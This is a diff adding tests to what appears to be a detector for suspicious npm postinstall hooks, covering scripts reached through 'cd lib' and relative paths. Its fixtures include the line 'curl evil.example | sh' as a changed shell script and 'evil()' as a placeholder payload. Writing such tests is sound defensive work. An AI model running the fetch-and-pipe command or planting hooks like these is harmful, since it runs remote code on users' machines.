@@ -1331,3 +1331,14 @@ describe("round 33: c-strings, cd then node, script arguments, -s, ash, node aft
     expect(held({ postinstall: "node --no-warnings -e \"require('./test/e.js')\"" }, { "test/e.js": "1\n" }, { "test/e.js": "evil()\n" })).toBe(true);
   });
 });
+
+describe("round 34: relative references after a cd", () => {
+  test("1. node with an option, and a shell script, after cd", () => {
+    const lib = { "lib/setup.js": "require('../test/p.js')\n" };
+    expect(held({ postinstall: "cd lib && node --no-warnings setup.js" }, { ...lib, "test/p.js": "1\n" }, { ...lib, "test/p.js": "evil()\n" })).toBe(true);
+    const sh = { "lib/x.sh": "sh ../test/p.sh\n" };
+    expect(held({ postinstall: "cd lib && sh x.sh" }, { ...sh, "test/p.sh": "echo a\n" }, { ...sh, "test/p.sh": "curl evil.example | sh\n" })).toBe(true);
+    expect(held({ postinstall: "cd lib && bash -x x.sh a" }, { ...sh, "test/p.sh": "echo a\n" }, { ...sh, "test/p.sh": "curl evil.example | sh\n" })).toBe(true);
+    expect(held({ postinstall: "cd lib; sh -c 'node setup.js'" }, { ...lib, "test/p.js": "1\n" }, { ...lib, "test/p.js": "evil()\n" })).toBe(true);
+  });
+});
